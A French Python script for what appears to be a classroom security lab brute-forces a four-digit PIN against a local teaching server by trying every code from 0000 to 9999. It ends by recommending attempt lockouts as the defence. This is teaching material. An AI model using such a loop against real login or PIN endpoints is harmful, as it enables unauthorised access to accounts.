#!/usr/bin/env python3

import requests
import time

# ---------------- Configuration par défaut ----------------
SERVER_URL = "http://127.0.0.1:5000"

# ---------------- Fonctions utilitaires ----------------
# Envoi d'une réponse au serveur web
def send_answer(session_id, attempt, captcha_id=None, captcha_answer=None):
    payload = {
        "session_id": session_id,
        "attempt": attempt
    }
    if captcha_id:
        payload["captcha_id"] = captcha_id
        payload["captcha_answer"] = captcha_answer
    r = requests.post(f"{SERVER_URL}/attempt", json=payload)
    try:
        return r.status_code, r.json()
    except Exception:
        return r.status_code, r.text

# Récupération d'une nouvelle session
def api_new_session(tp, class_key, server_url=SERVER_URL):
    payload = {"tp": tp, "class_key": class_key}
    r = requests.post(f"{server_url}/new_session", json=payload)
    if r.status_code in (200, 201):
        j = r.json()
        return j.get("session_id")
    else:
        raise RuntimeError(f"Erreur création session {r.status_code}: {r.text}")

# ---------------- TP1: Bruteforce 0000..9999 ----------------
# Objectif : Tester toutes les possibilités entre 0000 et 9999
# À noter : Attention au format (Par exemple, pour 10, on envoie => 0010)
# Pages du cours associés :
def bruteforce(session_id):
    for i in range(10000):
        answer = f"{i:04d}"
        status, resp = send_answer(session_id, answer)
        if status == 200 and isinstance(resp, dict) and resp.get("success") is True:
            print("Trouvé :", answer)
            return answer

    print("Non trouvé.")
    return None

if __name__ == "__main__":
    session = api_new_session(1, "0ter1a_s3cr3t", server_url=SERVER_URL)    
    bruteforce(session)

# Conclusion 
# Bruteforcer un code PIN classique, c'est étonnament simple
# Pour s'en protéger, on met en place un fail2ban (bannir ou verrouiller l'IP / l'utilisateur après un certain nombre de mauvaises tentatives)